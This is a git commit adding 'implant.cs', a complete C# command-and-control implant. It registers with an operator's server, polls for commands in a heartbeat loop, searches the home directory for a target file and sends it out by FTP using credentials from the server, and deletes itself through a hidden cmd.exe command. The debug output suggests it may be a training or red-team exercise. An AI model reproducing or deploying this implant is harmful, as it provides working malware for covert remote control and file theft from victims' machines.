3c8cfe5f7018b18e86361a3beba0b77dbcf82a7a
LyraDusk <lauren@meyerzone.net>
2023-05-13 14:48:39 -0400

    Implant implementation

---
+++ implant.cs
@@ -0,0 +1,271 @@
+using System.Net;
+using System.Net.Http;
+using System.Net.NetworkInformation;
+using System;
+using System.IO;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Diagnostics;
+using System.Reflection;
+
+
+namespace Implant
+{
+    class Connection {
+        static string cmd = "0"; // Current command
+        static string srvip = ""; // Server IP (passed in)
+        static string ftpserv = ""; // FTP Server
+        static string ftpuser = ""; // FTP User
+        static string ftppass = ""; // FTP Password
+        static int timeout = 30; // Seconds between heartbeats
+
+
+        // FTP Connection, uploading file at location file_loc
+        static async void ExfilData(string ip, string user, string pass, string file_loc)
+        {
+          try{
+            FtpWebRequest request = (FtpWebRequest)WebRequest.Create("ftp://" + ip);
+            request.Method = WebRequestMethods.Ftp.UploadFile;
+
+            request.Credentials = new NetworkCredential(user, pass);
+            request.KeepAlive = false;
+            request.UseBinary = true;
+            request.UsePassive = true;
+            using (FileStream fs = File.Open(file_loc, FileMode.Open, FileAccess.Read))
+            {
+              using (Stream requestStream = request.GetRequestStream())
+              {
+                await fs.CopyToAsync(requestStream);
+                using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
+                {
+                  Console.WriteLine($"DEBUG: Upload Complete, status {response.StatusDescription}");
+                }
+              }
+            }
+
+          }
+          catch (Exception ex)
+          {
+             Console.WriteLine(ex.Message.ToString());
+          }
+
+
+        }
+
+        // Gets the machine's MAC address
+        static string GetMAC()
+        {
+          string macAddr =
+            (
+                from nic in NetworkInterface.GetAllNetworkInterfaces()
+                where nic.OperationalStatus == OperationalStatus.Up
+                select nic.GetPhysicalAddress().ToString()
+            ).FirstOrDefault();
+          return macAddr;
+        }
+
+        // Gets the machine's IP
+        static string GetIP()
+        {
+          string content;
+          HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://icanhazip.com");
+          using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
+          using (Stream stream = response.GetResponseStream())
+          using (StreamReader sr = new StreamReader(stream))
+            {
+                content = sr.ReadLine();
+            }
+
+          string[] lines = content.Split(new string[] {Environment.NewLine}, StringSplitOptions.None);
+          return lines[0];
+        }
+
+        // Initiate an HTTP connection, then read the command from it.
+        // If the IP address given is invalid, this will just hang until it times out .
+        static void Register()
+        {
+          string MAC = GetMAC();
+          HttpWebRequest client = (HttpWebRequest)WebRequest.Create("http://" + srvip + ":8080/register");
+          client.Method = "POST";
+          string postData = "agent_id=" + MAC;
+          postData += "&command=" + cmd;
+          var data = Encoding.ASCII.GetBytes(postData);
+          client.ContentType = "application/x-www-form-urlencoded";
+          client.ContentLength = data.Length;
+          int tmp = ServicePointManager.DefaultConnectionLimit;
+          using (var stream = client.GetRequestStream())
+          {
+            stream.Write(data, 0, data.Length);
+          }
+          var response = (HttpWebResponse)client.GetResponse();
+          cmd = response.GetResponseHeader("cmd");
+          string responseText;
+          Console.WriteLine("Registration sent, response:");
+          using (StreamReader sr = new StreamReader(response.GetResponseStream()))
+          {
+            responseText = sr.ReadToEnd();
+          }
+          Console.WriteLine(responseText);
+          return;
+        }
+
+        // The HTTP request for the Exfil info
+        static void Exfil(int Found, string file_loc)
+        {
+          string MAC = GetMAC();
+
+          HttpWebRequest client = (HttpWebRequest)WebRequest.Create("http://" + srvip + ":8080/exfil");
+          client.Method = "POST";
+          string postData = "agent_id=" + MAC;
+          postData += "&found=" + Found.ToString();
+          var data = Encoding.ASCII.GetBytes(postData);
+          client.ContentType = "application/x-www-form-urlencoded";
+          client.ContentLength = data.Length;
+          using (var stream = client.GetRequestStream())
+          {
+            stream.Write(data, 0, data.Length);
+          }
+          var response = (HttpWebResponse)client.GetResponse();
+          Console.WriteLine("Exfil message sent, response: ");
+          string responseText;
+          using (StreamReader sr = new StreamReader(response.GetResponseStream()))
+          {
+            responseText = sr.ReadToEnd();
+          }
+          Console.WriteLine(responseText);
+
+          cmd = response.GetResponseHeader("cmd");
+          if(Found == 1) {
+            ftpserv = response.GetResponseHeader("host");
+            ftpuser = response.GetResponseHeader("ftpwebuser");
+            ftppass = response.GetResponseHeader("password");
+
+            ExfilData(ftpserv, ftpuser, ftppass, file_loc);
+          }
+          return;
+        }
+
+        // The periodic heartbeat request
+        static void HeartBeat()
+        {
+          string MAC = GetMAC();
+
+          HttpWebRequest client = (HttpWebRequest)WebRequest.Create("http://" + srvip + ":8080/command");
+          client.Method = "POST";
+          var postData = "agent_id=" + MAC;
+          var data = Encoding.ASCII.GetBytes(postData);
+          client.ContentType = "application/x-www-form-urlencoded";
+          client.ContentLength = data.Length;
+          using (var stream = client.GetRequestStream())
+          {
+            stream.Write(data, 0, data.Length);
+          }
+          var response = (HttpWebResponse)client.GetResponse();
+          cmd = response.GetResponseHeader("cmd");
+          Console.WriteLine("Heartbeat sent, response: ");
+          string responseText;
+          using (StreamReader sr = new StreamReader(response.GetResponseStream()))
+          {
+            responseText = sr.ReadToEnd();
+          }
+          Console.WriteLine(responseText);
+
+          return;
+        }
+
+        // The acknowledgement of the kill command (doesn't read response)
+        static void KillMsg()
+        {
+          string MAC = GetMAC();
+
+          HttpWebRequest client = (HttpWebRequest)WebRequest.Create("http://" + srvip + ":8080/manual_kill");
+          client.Method = "POST";
+          var postData = "agent_id=" + MAC;
+          var data = Encoding.ASCII.GetBytes(postData);
+          client.ContentType = "application/x-www-form-urlencoded";
+          client.ContentLength = data.Length;
+          using (var stream = client.GetRequestStream())
+          {
+            stream.Write(data, 0, data.Length);
+          }
+          client.GetResponse();
+          Console.WriteLine("Kill acknowledgement sent.");
+          return;
+        }
+
+        // Kills and deletes the program file
+        // Starts a command line (async) to delete the file after five seconds, then kills the process
+        static void Kill()
+        {
+          Process proc = new Process();
+          proc.StartInfo.FileName = "cmd.exe";
+          proc.StartInfo.Arguments = "/C ping 1.1.1.1 -n 1 -w 5000 > Nul & Del " +
+            (string)Assembly.GetEntryAssembly().Location;
+          proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+          Console.WriteLine("Killing.");
+          proc.Start();
+
+
+          Environment.Exit(0);
+        }
+
+        // Search the entire home directory for a file called target.py, then Exfil
+        static void FileSearch()
+        {
+          Console.WriteLine("Searching...");
+          string[] filelist = Directory.GetFiles(@"C:\home", "*\\target.py", SearchOption.AllDirectories);
+          if(filelist.Length == 0)
+          {
+            Console.WriteLine("File not found.");
+            Exfil(0, "");
+
+          }
+          else
+          {
+            Console.WriteLine("File found at " + filelist[0]);
+            Exfil(1, filelist[0]);
+          }
+          return;
+        }
+
+        static void Main(string[] args)
+        {
+          try
+          {
+            srvip = args[0];
+          }
+          catch (Exception ex)
+          {
+            Console.Write("You need to specify an IP in the command line.\n");
+            Environment.Exit(1);
+          }
+          Console.WriteLine("DEBUG: IP - " + (string)GetIP());
+          Console.WriteLine("DEBUG: MAC - " + (string)GetMAC());
+
+          Register(); // will hang if server ip not valid
+          while (true) {
+            Console.WriteLine(cmd);
+            switch(cmd) {
+              case "0":
+                System.Threading.Thread.Sleep(timeout);
+                HeartBeat();
+                break;
+              case "1":
+                FileSearch();
+                break;
+              case "2":
+                KillMsg();
+                Kill();
+                break; //should be unreachable but w/e
+              default:
+                cmd = "0";
+                break;
+            }
+          }
+
+
+
+        }
+    }
+}
